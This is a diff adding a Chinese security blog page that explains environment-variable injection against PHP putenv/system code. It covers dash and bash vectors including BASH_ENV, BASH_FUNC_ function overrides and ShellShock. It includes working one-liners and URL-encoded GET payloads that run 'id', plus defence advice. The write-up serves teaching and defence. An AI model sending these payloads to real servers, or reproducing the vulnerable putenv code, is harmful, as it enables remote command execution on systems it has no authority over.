@@ -1,0 +1,325 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>环境变量注入 | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="场景还原以下 PHP 代码片段是典型“环境变量注入”场景： 1234567&lt;?phpforeach ($_REQUEST[&#x27;envs&#x27;] as $k &#x3D;&gt; $v) &#123;    putenv(&quot;&#123;$k&#125;&#x3D;&#123;$v&#125;&quot;);&#125;&#x2F;* … 其他业务逻辑 … *&#x2F;system(&#x27;echo he">
+<meta property="og:type" content="article">
+<meta property="og:title" content="环境变量注入">
+<meta property="og:url" content="https://sakuraraindrop.github.io/2025/09/03/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="cheng_xing&#39;s blog">
+<meta property="og:description" content="场景还原以下 PHP 代码片段是典型“环境变量注入”场景： 1234567&lt;?phpforeach ($_REQUEST[&#x27;envs&#x27;] as $k &#x3D;&gt; $v) &#123;    putenv(&quot;&#123;$k&#125;&#x3D;&#123;$v&#125;&quot;);&#125;&#x2F;* … 其他业务逻辑 … *&#x2F;system(&#x27;echo he">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
+<meta property="article:published_time" content="2025-09-03T08:53:18.000Z">
+<meta property="article:modified_time" content="2025-09-03T09:01:43.407Z">
+<meta property="article:author" content="cheng_xing">
+<meta property="article:tag" content="shellshock">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "环境变量注入",
+  "url": "https://sakuraraindrop.github.io/2025/09/03/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/",
+  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
+  "datePublished": "2025-09-03T08:53:18.000Z",
+  "dateModified": "2025-09-03T09:01:43.407Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "cheng_xing",
+      "url": "https://sakuraraindrop.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/09/03/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '环境变量注入',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">环境变量注入</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">环境变量注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-03T08:53:18.000Z" title="发表于 2025-09-03 16:53:18">2025-09-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-03T09:01:43.407Z" title="更新于 2025-09-03 17:01:43">2025-09-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="场景还原"><a href="#场景还原" class="headerlink" title="场景还原"></a>场景还原</h2><p>以下 PHP 代码片段是典型“环境变量注入”场景：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>=<span class="subst">&#123;$v&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* … 其他业务逻辑 … */</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>);  <span class="comment">// =&gt; 最终执行  sh -c &quot;echo hello&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们能完全控制运行时的环境变量  </li>
+<li>无法修改 <code>echo hello</code> 本身  </li>
+<li>目标系统 <code>/bin/sh</code> 可能是 dash 或 bash 的软链接</li>
+</ul>
+<hr>
+<h2 id="Dash-中的利用点"><a href="#Dash-中的利用点" class="headerlink" title="Dash 中的利用点"></a>Dash 中的利用点</h2><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>触发条件</th>
+<th>命令注入示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ENV</strong></td>
+<td>必须加 <code>-i</code>（交互式）</td>
+<td><code>ENV=&#39;$(id&gt;&amp;2)&#39; dash -i -c &#39;echo hello&#39;</code></td>
+</tr>
+<tr>
+<td><strong>PS1 &#x2F; PS2 &#x2F; PS4</strong></td>
+<td>进入交互式 shell 后自动触发</td>
+<td>仅适合拿到 tty 后手动利用</td>
+</tr>
+</tbody></table>
+<ul>
+<li>dash 在非交互模式下（<code>sh -c</code>）<strong>不会</strong>解析 <code>ENV</code> 与提示符变量，因此<strong>无法直接利用</strong>。</li>
+</ul>
+<hr>
+<h2 id="Bash-中的利用点"><a href="#Bash-中的利用点" class="headerlink" title="Bash 中的利用点"></a>Bash 中的利用点</h2><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>触发条件</th>
+<th>命令注入示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>BASH_ENV</strong></td>
+<td><code>bash -c</code> 且非 <code>sh</code> 软链</td>
+<td><code>BASH_ENV=&#39;$(id&gt;&amp;2)&#39; bash -c &#39;echo hello&#39;</code></td>
+</tr>
+<tr>
+<td><strong>ENV</strong></td>
+<td>要求交互式或 login shell</td>
+<td><code>ENV=&#39;$(id&gt;&amp;2)&#39; bash -i -c &#39;echo hello&#39;</code></td>
+</tr>
+<tr>
+<td><strong>PS1</strong></td>
+<td>交互式</td>
+<td><code>PS1=&#39;$(id&gt;&amp;2)&#39; bash</code></td>
+</tr>
+<tr>
+<td><strong>PROMPT_COMMAND</strong></td>
+<td>交互式</td>
+<td><code>PROMPT_COMMAND=&#39;id&#39; bash</code></td>
+</tr>
+<tr>
+<td><strong>BASH_FUNC_<name>%%</strong> 或 <strong>BASH_FUNC_<name>()</strong></td>
+<td>任意模式（<code>-c</code> 亦可）</td>
+<td>见下文</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>当 <code>/bin/sh → bash</code> 时，<strong>BASH_ENV</strong> 失效（<code>act_like_sh=1</code>），但 <strong>BASH_FUNC_</strong> 系列仍然有效。</p>
+</blockquote>
+<hr>
+<h2 id="通杀武器：BASH-FUNC-匿名函数注入"><a href="#通杀武器：BASH-FUNC-匿名函数注入" class="headerlink" title="通杀武器：BASH_FUNC_ 匿名函数注入"></a>通杀武器：BASH_FUNC_ 匿名函数注入</h2><p>Bash 在启动时会扫描形如 <code>BASH_FUNC_xxx%%</code>（4.4+）或 <code>BASH_FUNC_xxx()</code>（4.2 补丁版）的环境变量，把值当成函数体直接解析并注册同名函数。</p>
+<h3 id="Bash-4-4-及以上"><a href="#Bash-4-4-及以上" class="headerlink" title="Bash 4.4 及以上"></a>Bash 4.4 及以上</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br><span class="line"><span class="comment"># 实际执行 id</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Bash-4-2-4-3（如-CentOS-7）"><a href="#Bash-4-2-4-3（如-CentOS-7）" class="headerlink" title="Bash 4.2&#x2F;4.3（如 CentOS 7）"></a>Bash 4.2&#x2F;4.3（如 CentOS 7）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="无补丁老版本（ShellShock）"><a href="#无补丁老版本（ShellShock）" class="headerlink" title="无补丁老版本（ShellShock）"></a>无补丁老版本（ShellShock）</h3><p>直接利用破壳漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TEST=<span class="string">&#x27;() &#123; :;&#125;; id&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="一张速查表"><a href="#一张速查表" class="headerlink" title="一张速查表"></a>一张速查表</h2><table>
+<thead>
+<tr>
+<th>Shell</th>
+<th>变量</th>
+<th><code>sh -c</code> 是否可用</th>
+<th>额外参数</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dash</td>
+<td>ENV</td>
+<td>❌</td>
+<td><code>-i</code></td>
+<td>需交互式</td>
+</tr>
+<tr>
+<td>dash</td>
+<td>PS1&#x2F;PS4</td>
+<td>❌</td>
+<td><code>-i</code></td>
+<td>PS4 仅解析变量</td>
+</tr>
+<tr>
+<td>bash</td>
+<td>BASH_ENV</td>
+<td>❌</td>
+<td>—</td>
+<td>仅 <code>bash -c</code></td>
+</tr>
+<tr>
+<td>bash</td>
+<td>ENV</td>
+<td>❌</td>
+<td><code>-i</code> 或 login</td>
+<td>—</td>
+</tr>
+<tr>
+<td>bash</td>
+<td>PS1&#x2F;PROMPT</td>
+<td>❌</td>
+<td><code>-i</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td>bash</td>
+<td>BASH_FUNC</td>
+<td>✅</td>
+<td>—</td>
+<td><strong>最通用</strong></td>
+</tr>
+<tr>
+<td>bash&#x2F;dash</td>
+<td>ShellShock</td>
+<td>✅</td>
+<td>—</td>
+<td>老系统需无补丁</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="实战-payload"><a href="#实战-payload" class="headerlink" title="实战 payload"></a>实战 payload</h2><p>结合上文，给出可直接丢进 GET&#x2F;POST 参数的 payload（URL-encode 后）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 针对 Bash 4.4+</span><br><span class="line">GET /1.php?envs[BASH_FUNC_echo%25%25]=()%20&#123;%20id;%20&#125;</span><br><span class="line"></span><br><span class="line"># 针对 Bash 4.2/CentOS 7</span><br><span class="line">GET /1.php?envs[BASH_FUNC_echo()]=()%20&#123;%20id;%20&#125;</span><br><span class="line"></span><br><span class="line"># 存在 ShellShock</span><br><span class="line">GET /1.php?envs[TEST]=()%20&#123;%20:;%20&#125;;%20id</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><ol>
+<li><strong>白名单环境变量</strong>：启动子进程前显式清空或过滤 <code>ENV</code>、<code>BASH_ENV</code>、<code>PS*</code>、<code>BASH_FUNC_*</code> 等。</li>
+<li><strong>最小权限运行</strong>：避免 Web&#x2F;服务进程拥有写文件系统权限，阻断 <code>LD_PRELOAD</code> 等旁路。</li>
+<li><strong>升级 Bash</strong>：确保系统已修补 ShellShock 并运行较新版本（4.4+）。</li>
+</ol>
+<hr>
+<h2 id="总结流程图"><a href="#总结流程图" class="headerlink" title="总结流程图"></a>总结流程图</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">可控环境变量</span><br><span class="line">    │</span><br><span class="line">    ├─ Dash</span><br><span class="line">    │   ├─ ENV（需 -i）      ──► 交互式 shell 可利用</span><br><span class="line">    │   └─ PS*               ──► 同上</span><br><span class="line">    │</span><br><span class="line">    └─ Bash</span><br><span class="line">        ├─ BASH_ENV          ──► bash -c 可用</span><br><span class="line">        ├─ ENV/PS1/PROMPT    ──► 需交互式</span><br><span class="line">        ├─ BASH_FUNC_*       ──► 任意模式，最推荐</span><br><span class="line">        └─ ShellShock        ──► 老系统无补丁</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>一句话结论：<br><strong>只要能控制环境变量，哪怕命令完全固定，也仍有机会在 Bash 中实现 RCE；Dash 则相对受限。</strong></p>
+</blockquote>
+<hr>
+<blockquote>
+<p>参考链接  </p>
+<ul>
+<li>dr0n: <a target="_blank" rel="noopener" href="https://www.dr0n.top/posts/7b50f6ef/#BASH-ENV">https://www.dr0n.top/posts/7b50f6ef/#BASH-ENV</a>  </li>
+<li>离别歌: <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></li>
+</ul>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/09/03/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">https://sakuraraindrop.github.io/2025/09/03/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/shellshock/">shellshock</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/09/02/XSS-1-%E4%BB%8EXSS%E5%BC%80%E5%A7%8B/" title="XSS-1-从XSS开始"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">XSS-1-从XSS开始</div></div></div></a><a class="pagination-related  no-desc" href="/2025/09/03/NepCTF2025/" title="NepCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">NepCTF2025</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E8%BF%98%E5%8E%9F"><span class="toc-number">1.</span> <span class="toc-text">场景还原</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dash-%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">Dash 中的利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash-%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">Bash 中的利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E6%9D%80%E6%AD%A6%E5%99%A8%EF%BC%9ABASH-FUNC-%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">通杀武器：BASH_FUNC_ 匿名函数注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-4-4-%E5%8F%8A%E4%BB%A5%E4%B8%8A"><span class="toc-number">4.1.</span> <span class="toc-text">Bash 4.4 及以上</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-4-2-4-3%EF%BC%88%E5%A6%82-CentOS-7%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">Bash 4.2&#x2F;4.3（如 CentOS 7）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E8%A1%A5%E4%B8%81%E8%80%81%E7%89%88%E6%9C%AC%EF%BC%88ShellShock%EF%BC%89"><span class="toc-number">4.3.</span> <span class="toc-text">无补丁老版本（ShellShock）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%BC%A0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">5.</span> <span class="toc-text">一张速查表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98-payload"><span class="toc-number">6.</span> <span class="toc-text">实战 payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">7.</span> <span class="toc-text">防御建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">8.</span> <span class="toc-text">总结流程图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/27/20250927%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250927随缘刷题">20250927随缘刷题</a><time datetime="2025-09-27T04:45:15.000Z" title="发表于 2025-09-27 12:45:15">2025-09-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/19/20250919%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250919随缘刷题">20250919随缘刷题</a><time datetime="2025-09-19T14:11:53.000Z" title="发表于 2025-09-19 22:11:53">2025-09-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/16/20250916%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" title="20250916论文学习">20250916论文学习</a><time datetime="2025-09-16T07:49:01.000Z" title="发表于 2025-09-16 15:49:01">2025-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/" title="湾区杯2025">湾区杯2025</a><time datetime="2025-09-08T00:47:34.000Z" title="发表于 2025-09-08 08:47:34">2025-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/06/ImaginaryCTF2025/" title="ImaginaryCTF2025">ImaginaryCTF2025</a><time datetime="2025-09-06T07:03:31.000Z" title="发表于 2025-09-06 15:03:31">2025-09-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
